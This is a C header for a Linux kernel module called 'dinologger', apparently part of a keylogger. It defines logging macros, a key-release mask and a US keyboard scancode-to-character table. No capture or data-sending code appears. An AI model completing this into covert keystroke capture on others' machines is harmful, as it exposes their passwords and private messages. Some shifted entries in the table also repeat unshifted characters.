#pragma once

#include "linux/init.h"
#include "linux/module.h"
#include "linux/fs.h"
#include "linux/miscdevice.h"
#include "linux/interrupt.h"
#include "asm/io.h"

#define DEVICE_NAME "dinologger"
#define LOG(msg) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n")
#define LOGF(msg, ...) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n", __VA_ARGS__)

#define RELEASE 0b10000000

#define unmapped_end                                                           \
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0

#define ESCAPE 27
#define BACKSPACE '\b'
#define TAB '\t'
#define ENTER 0
#define CTRL 0
#define LSHIFT 0
#define RSHIFT 0
#define ALT 0
#define SPACE ' '
#define CAPS_LOCK 0
#define F1 0
#define F2 0
#define F3 0
#define F4 0
#define F5 0
#define F6 0
#define F7 0
#define F8 0
#define F9 0
#define F10 0
#define F11 0
#define F12 0
#define NUM_LOCK 0
#define SCROLL_LOCK 0
#define HOME 0
#define UP 0
#define LEFT 0
#define RIGHT 0
#define DOWN 0
#define PAGE_UP 0
#define PAGE_DOWN 0
#define END 0
#define INSERT 0
#define DELETE 0
#define UNMAPPED 0

#define US_KBMAP                                                               \
	0, ESCAPE, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=',     \
		BACKSPACE, TAB, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', \
		']', ENTER, CTRL, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';',    \
		'\'', '`', LSHIFT, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.',  \
		'/', RSHIFT, '*', ALT, SPACE, CAPS_LOCK, F1, F2, F3, F4, F5, F6, F7,   \
		F8, F9, F10, NUM_LOCK, SCROLL_LOCK, HOME, UP, PAGE_UP, '-', LEFT,      \
		UNMAPPED, RIGHT, '+', END, DOWN, PAGE_DOWN, INSERT, DELETE, UNMAPPED,  \
		UNMAPPED, UNMAPPED, F11, F12, unmapped_end, 0, ESCAPE, '1', '2', '3',  \
		'4', '5', '6', '7', '8', '9', '0', '_', '=', BACKSPACE, TAB, 'Q', 'W', \
		'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '[', ']', ENTER, CTRL, 'A',    \
		'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';', '\'', '`', LSHIFT, '\\',  \
		'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/', RSHIFT, '*', ALT,    \
		SPACE, CAPS_LOCK, F1, F2, F3, F4, F5, F6, F7, F8, F9, F10, NUM_LOCK,   \
		SCROLL_LOCK, HOME, UP, PAGE_UP, '-', LEFT, UNMAPPED, RIGHT, '+', END,  \
		DOWN, PAGE_DOWN, INSERT, DELETE, UNMAPPED, UNMAPPED, UNMAPPED, F11,    \
		F12, unmapped_end,
